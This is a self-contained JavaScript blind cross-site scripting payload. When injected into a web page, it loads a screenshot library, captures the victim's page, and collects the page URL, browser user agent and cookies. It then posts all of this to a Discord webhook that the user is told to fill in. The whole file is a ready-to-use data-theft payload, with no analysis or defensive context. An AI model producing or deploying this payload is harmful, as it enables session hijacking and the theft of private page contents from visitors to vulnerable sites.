(function() {
    // --- CONFIGURATION ---
    // PASTE YOUR DISCORD WEBHOOK URL HERE
    const discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE';

    // --- MAIN FUNCTION ---
    function run() {
        // First, load the html2canvas library
        const script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
        document.head.appendChild(script);

        script.onload = () => {
            // Once the library is loaded, take the screenshot
            html2canvas(document.body).then(canvas => {
                // Convert the screenshot canvas to a data URL
                const screenshotData = canvas.toDataURL('image/jpeg', 0.7);
                const screenshotBlob = dataURLtoBlob(screenshotData);

                // Prepare the data to be sent to Discord
                const formData = new FormData();
                const embed = {
                    title: "Blind XSS Fired with Screenshot!",
                    description: `**Vulnerable URL:**\n\`\`\`${document.location.href}\`\`\``,
                    color: 5814783, // A nice blue color
                    fields: [
                        { name: "User Agent", value: navigator.userAgent },
                        { name: "Cookies", value: `\`\`\`${document.cookie || 'Not Accessible'}\`\`\`` }
                    ],
                    image: {
                        url: "attachment://screenshot.jpg"
                    }
                };
                formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
                formData.append('file', screenshotBlob, 'screenshot.jpg');

                // Send everything to your Discord webhook
                fetch(discordWebhookUrl, {
                    method: 'POST',
                    body: formData,
                });
            });
        };
    }

    // --- HELPER FUNCTION ---
    // Converts a data URL to a Blob object
    function dataURLtoBlob(dataurl) {
        const arr = dataurl.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) {
            u8arr[n] = bstr.charCodeAt(n);
        }
        return new Blob([u8arr], { type: mime });
    }

    // --- EXECUTE ---
    run();
})();
